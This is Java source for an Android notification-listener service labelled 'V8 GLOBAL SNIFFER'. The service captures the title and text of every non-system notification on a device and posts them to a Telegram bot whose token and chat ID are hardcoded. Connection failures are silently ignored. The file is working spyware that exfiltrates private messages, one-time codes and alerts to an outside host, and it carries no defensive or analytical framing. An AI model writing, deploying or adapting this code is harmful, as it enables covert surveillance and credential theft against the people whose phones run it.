package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import java.io.IOException;

public class NotificationService extends NotificationListenerService {

    private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getPackageName() == null || sbn.getNotification() == null) {
            return;
        }

        String appName = sbn.getPackageName();
        if (appName.contains("android")) {
            return;
        }

        CharSequence titleChars = sbn.getNotification().extras.getCharSequence("android.title");
        CharSequence textChars = sbn.getNotification().extras.getCharSequence("android.text");

        String title = titleChars != null ? titleChars.toString() : "No Title";
        String text = textChars != null ? textChars.toString() : "No Text";

        if (text.equals("No Text")) {
            return;
        }

        sendToTelegram(appName, title, text);
    }

    private void sendToTelegram(String app, String title, String msg) {
        OkHttpClient client = new OkHttpClient();
        
        String report = "🛰 **V8 GLOBAL SNIFFER**\n\n" +
                        "📱 App: " + app + "\n" +
                        "👤 Title: " + title + "\n" +
                        "💬 Msg: " + msg;

        RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", report)
                .build();

        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                // تجاهل في حالة فشل الاتصال
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response != null) {
                    response.close();
                }
            }
        });
    }
}
